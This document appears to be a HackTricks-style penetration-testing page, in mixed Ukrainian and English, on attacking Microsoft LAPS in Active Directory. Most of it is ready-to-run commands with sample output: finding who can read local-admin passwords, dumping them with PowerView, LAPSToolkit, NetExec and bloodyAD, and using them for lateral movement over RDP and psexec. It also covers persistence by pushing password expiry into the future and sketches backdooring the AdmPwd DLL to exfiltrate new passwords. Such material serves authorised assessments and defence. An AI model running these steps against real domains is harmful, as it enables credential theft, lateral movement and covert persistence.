# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Наразі під час assessment можна зустріти **2 LAPS flavours**:

- **Legacy Microsoft LAPS**: зберігає пароль локального адміністратора в **`ms-Mcs-AdmPwd`** і час завершення дії в **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (вбудовано в Windows починаючи з оновлень квітня 2023): усе ще може емулювати legacy mode, але в native mode використовує атрибути **`msLAPS-*`**, підтримує **password encryption**, **password history** і **DSRM password backup** для domain controllers.

LAPS призначений для керування **local administrator passwords**, роблячи їх **unique, randomized, and frequently changed** на комп'ютерах, приєднаних до domain. Якщо ви можете читати ці атрибути, зазвичай можна **pivot as the local admin** до ураженого host. У багатьох середовищах цікаво не лише прочитати сам password, а й знайти **who was delegated access** до атрибутів password.

### Legacy Microsoft LAPS attributes

В computer objects домену реалізація legacy Microsoft LAPS додає два атрибути:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS додає кілька нових атрибутів до computer objects:

- **`msLAPS-Password`**: clear-text password blob, що зберігається як JSON, коли encryption не ввімкнено
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data для domain controllers
- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking, що використовується новішою rollback-detection logic (Windows Server 2025 forest schema)

Коли **`msLAPS-Password`** можна прочитати, значення є JSON object, що містить account name, update time і clear-text password, наприклад:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Перевірте, чи активовано
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Ви можете **завантажити raw LAPS policy** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакета [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у human-readable format.

### Legacy Microsoft LAPS PowerShell cmdlets

If the legacy LAPS module is installed, the following cmdlets are usually available:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS постачається з новим модулем PowerShell і новими cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Кілька операційних деталей тут мають значення:

- **`Get-LapsADPassword`** автоматично обробляє **legacy LAPS**, **clear-text Windows LAPS** і **encrypted Windows LAPS**.
- Якщо пароль зашифрований і ви можете **читати** його, але не **decrypt** його, cmdlet повертає метадані, такі як **`Source`**, **`DecryptionStatus`** і **`AuthorizedDecryptor`**, навіть якщо не може повернути clear-text пароль.
- В **encrypted Windows LAPS**, **read permission** і **decrypt permission** — це **різні controls**. Наявність OU / object read access не означає, що ви автоматично можете decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** доступна лише тоді, коли увімкнено **Windows LAPS encryption**.
- На domain controllers, повернене source може бути **`EncryptedDSRMPassword`**.

Це корисно під час assessment, тому що поле **`AuthorizedDecryptor`** показує, **для якого user або group було зашифровано blob**, часто перетворюючи невдале читання password на новий target для privilege-escalation.

### PowerView / LDAP

**PowerView** також можна використати, щоб з’ясувати, **хто може читати password і прочитати його**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Якщо **`msLAPS-Password`** є читабельним, розберіть повернений JSON і витягніть **`p`** для пароля та **`n`** для імені керованого локального облікового запису адміністратора.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Це поле **`n`** має значення в новіших розгортаннях, тому що **Windows LAPS automatic account management** може націлювати **custom account** замість вбудованого **`Administrator`**, а новіші системи **Windows 11 24H2 / Windows Server 2025** можуть навіть **randomize** назву цього account.

### Linux / remote tooling

Modern tooling підтримує як legacy Microsoft LAPS, так і Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Примітки:

- Нові збірки **NetExec** підтримують **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** і **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** усе ще корисний для **legacy Microsoft LAPS** з Linux, але він цілить лише в **`ms-Mcs-AdmPwd`**.
- Новіші cross-platform інструменти, такі як **`LAPS4LINUX`**, інструменти на базі **`dpapi-ng`**, а також нещодавні workflows **NetExec** можуть також обробляти **native Windows LAPS** з non-Windows хостів.
- Якщо середовище використовує **encrypted Windows LAPS**, простого LDAP read недостатньо; вам також потрібно бути **authorized decryptor** (або мати еквівалентний матеріал для дешифрування, наприклад offline domain DPAPI-NG root key material).
- На **Windows 11 24H2 / Windows Server 2025** не припускайте, що managed local admin завжди **`Administrator`**. Automatic account management може створити custom account і за потреби randomize його ім’я, тож спочатку дізнайтеся ім’я акаунта через **`n`** / **`Account`** перед використанням **`--laps`** у масштабі.

### Зловживання directory synchronization

Якщо у вас є domain-level права **directory synchronization** замість прямого read access на кожному computer object, LAPS усе одно може бути цікавим.

Комбінація **`DS-Replication-Get-Changes`** з **`DS-Replication-Get-Changes-In-Filtered-Set`** або **`DS-Replication-Get-Changes-All`** може використовуватися для synchronizе **confidential / RODC-filtered** атрибутів, таких як legacy **`ms-Mcs-AdmPwd`**. BloodHound моделює це як **`SyncLAPSPassword`**. Дивіться [DCSync](dcsync.md) для background про replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) полегшує enumeration LAPS за допомогою кількох функцій.\
Одна з них — парсинг **`ExtendedRights`** для **всіх computers із увімкненим LAPS.** Це показує **groups**, яким спеціально **delegated to read LAPS passwords**, і це часто користувачі в protected groups.\
**Account**, який **приєднав computer** до domain, отримує `All Extended Rights` над цим host, і це право дає **account** можливість **read passwords**. Enumeration може показати user account, який може read LAPS password на host. Це може допомогти нам **target specific AD users**, які можуть read LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Дамп паролів LAPS за допомогою NetExec / CrackMapExec

Якщо у вас немає інтерактивного PowerShell, ви можете зловживати цим привілеєм віддалено через LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Це вивантажує всі LAPS secrets, які користувач може read, allowing you to move laterally з іншим local administrator password.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Expiration Date

Після отримання admin, можна **отримати passwords** і **запобігти** тому, щоб machine **оновлювала** свій **password**, **встановивши дату закінчення дії на майбутнє**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS використовує **`msLAPS-PasswordExpirationTime`** натомість:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Пароль все одно буде обертатися, якщо **admin** використовує **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, або якщо увімкнено **Do not allow password expiration time longer than required by policy**.

### Caveat щодо rollback snapshot на новішому Windows LAPS

Старі трюки зі **snapshot / image rollback** є **менш надійними** проти сучасних розгортань **Windows LAPS**. На **Windows 11 24H2 / Windows Server 2025**, якщо схема forest містить **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client порівнює локально кешований GUID зі значенням, що зберігається в AD, і **негайно обертає пароль**, коли rollback створює **torn state**.

На практиці це означає, що persistence на основі snapshot або спроби відновити старий відомий local admin password можуть швидко згоріти замість того, щоб пережити до наступного звичайного expiration.

Цей захист застосовується лише до **AD-backed Windows LAPS** і все ще залежить від того, чи може відновлена машина **authenticate back to AD**. Якщо машина більше не може спілкуватися з AD, **password history** або **AD backup access** все ще можуть врятувати ситуацію.

### Caveat щодо tamper автоматичного керування account

Коли увімкнено **automatic account management**, Windows LAPS керує життєвим циклом керованого local admin account. Неочікувані спроби перейменувати, переналаштувати або іншим чином втручатися в цей account можуть бути відхилені з **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, тож persistence, яка залежить від непомітного зміни керованого LAPS account, є менш надійною на новіших endpoints.

### Відновлення historical passwords з AD backups

Коли увімкнено **Windows LAPS encryption + password history**, змонтовані AD backups можуть стати додатковим джерелом secrets. Якщо ви можете отримати доступ до змонтованого AD snapshot і використовувати **recovery mode**, ви можете запитувати старі збережені passwords без звернення до live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Це переважно актуально під час **AD backup theft**, **offline forensics abuse** або **disaster-recovery media access**.

### Backdoor

Оригінальний вихідний код для legacy Microsoft LAPS можна знайти [here](https://github.com/GreyCorbel/admpwd), тому можна додати backdoor у код (наприклад, всередині методу `Get-AdmPwdPassword` у `Main/AdmPwd.PS/Main.cs`), який якимось чином **exfiltrate нові паролі або зберігатиме їх десь**.

Потім скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
